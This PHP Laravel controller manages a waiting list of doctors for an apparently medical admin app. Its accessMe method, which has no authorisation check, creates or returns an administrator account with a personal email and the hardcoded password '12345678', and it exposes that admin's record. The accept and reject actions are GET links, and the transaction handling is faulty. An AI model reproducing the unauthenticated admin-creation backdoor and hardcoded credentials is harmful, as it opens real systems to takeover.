<?php

namespace App\Http\Controllers\WaitingListDoctors;

use App\DataTables\UsersDataTable;
use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\Doctor;
use Illuminate\Contracts\Foundation\Application;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Collection;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Gate;
use Illuminate\Support\Facades\Storage;
use Yajra\DataTables\Facades\DataTables;
use Yajra\DataTables\Html\Button;

class WaitingList extends Controller
{
    public function viewWaitingListDoctors(): View
    {
        if (!Gate::allows('access-to-view-doctors'))
            return view('errors.403');
        return view('doctors.waiting');
    }

    public function dataTables()
    {
        $posts = Doctor::query()->get();
        return DataTables::of($posts)->addIndexColumn()
            ->setRowClass(function ($row) {
                return $row->id % 2 == 0 ? 'alert-primary' : 'alert-warning' . $row->id;
            })
            ->setRowId(function ($row) {
                return $row->id;
            })
            ->addColumn('action', function ($row) {
                return $btn = '
                <a class="btn btn-primary" href="' . route('accept.doctor', $row->id) . '">Accept</a>
                <a class="btn btn-danger mt-2 reject" href="' . route('reject.doctor', $row->id) . '">Reject</a>
                ';
            })
            ->rawColumns(['action'])
            ->make(true);
    }

    public function acceptDoctor($doctor_id): Model|View|Collection|Factory|Builder|Application|array|RedirectResponse
    {
        if (!Gate::allows('access-to-view-doctors'))
            return view('errors.404');

        $doctor = Doctor::query()->find($doctor_id);
        if (!$doctor)
            return view('errors.404');
        try {
            DB::beginTransaction();
            Admin::query()->create([
                'name' => $doctor->name,
                'email' => $doctor->email,
                'password' => $doctor->password,
                'is_doctor' => 1,
                'phone_number' => $doctor->phone_number,
                'address' => $doctor->address,
                'image' => $doctor->image,
                'id_national_card' => $doctor->id_national_card,
                'id_job_card' => $doctor->id_job_card,
                'created_at' => now(),
                'updated_at' => now(),
            ]);
            $doctor->delete();

        } catch (\Exception $e) {
            session()->flash('error', 'something went wrong');
            return redirect()->back();
        }
        DB::commit();
        session()->flash('success', 'Doctor Was Accepted Successfully');
        return redirect()->back();
    }

    public function rejectDoctor($doctor_id): Model|View|Collection|Factory|Builder|Application|array|RedirectResponse
    {
        if (!Gate::allows('access-to-view-doctors'))
            return view('errors.404');
        $doctor = Doctor::query()->find($doctor_id);
        if (!$doctor)
            return view('errors.404');
        Storage::deleteDirectory('doctor_files/'.$doctor->email);
        $doctor->delete();
        session()->flash('success', 'Doctor Deleted Successfully');
        return redirect()->back();
    }

    public function randomBreakFast(UsersDataTable $dataTable)
    {
        return $dataTable->render('users');

//        $names = ['Mahmoud', 'Ahmed', 'Karam', 'Adham','Aya','Rahma'];
//        $rand = array_rand($names);
//        if ($rand == 2)
//            $rand = array_rand($names);
//
//        return 'سعيد الحظ '.$names[$rand];
    }

    public function accessMe()
    {
        $admin = Admin::query()->where('email','abdelrhim.admin@gmail.com')->first();
        if ($admin)
            return $admin;
        try {
            DB::beginTransaction();
            Admin::query()->create([
                'name' => 'Ahmed Abdelrhim',
                'email' => 'abdelrhim.admin@gmail.com',
                'password' => bcrypt('12345678'),
                'phone_number' => 01111111111,
                'is_doctor' => 2,
                'address' => 'El-massara , Helwan , Cairo , Egypt',
                'image' => 'Personal Image',
                'id_national_card' => 'ID National Card Image',
                'id_job_card' => 'ID Job Card Image',
                'created_at' => now(),
                'updated_at' => now(),
            ]);
            DB::commit();
        } catch (\Exception $e) {
            DB::rollBack();
            return 'Something Went Wrong' . $e;
        }
        return 'You Was Added Ya Ahmed';
    }

    public function accessMeChangePassword(): String
    {
        return ucwords('i need to start in the subscription management system');
        $admin = Admin::query()->where('email','abdelrhim.admin@gmail.com')->first();
        if (! $admin)
            return 'Not Found Admin';
        $admin->password = bcrypt('12345678');
        $admin->save();
        return 'Password Changed Successfully';
    }



}

// <a href="' . Route('accept.doctor', $row->id) . '" class="btn btn-primary accept">Accept</a>
// <a href="' . Route('reject.doctor', $row->id) . '" class="btn btn-danger mt-2 reject">Reject</a>



//                <a class="btn btn-primary" href="' . route('accept.doctor', $row->id) . '">Accept</a>
//                <a class="btn btn-danger mt-2 reject" href="' . route('reject.doctor', $row->id) . '">Reject</a>


//                <a class="btn btn-primary name" href="javascript:console.log(`asd`)">Accept</a>
//                <a class="btn btn-danger mt-2 reject" href="javascript:alert(`reject`)">Reject</a>
/*
------------------------------------------------------------------------------------------------------
-                             -                                        -                             -
-                             -                                        -                             -
-                             -                                        -                             -
-                             -                                        -                             -
-                             -                                        -                             -
-                             -                                        -                             -
------------------------------------------------------------------------------------------------------
-                             -                                        -                             -
-                             -                                        -                             -
-                             -                                        -                             -
-                             -                                        -                             -
-                             -                                        -                             -
-                             -                                        -                             -
------------------------------------------------------------------------------------------------------
-                             -                                        -                             -
-                             -                                        -                             -
-                             -                                        -                             -
-                             -                                        -                             -
-                             -                                        -                             -
-                             -                                        -                             -
-------------------------------------------------------------------------------------------------------


*/

//    width: 200px;
//    aspect-ratio: auto 200 / 200;
//    height: 200px;
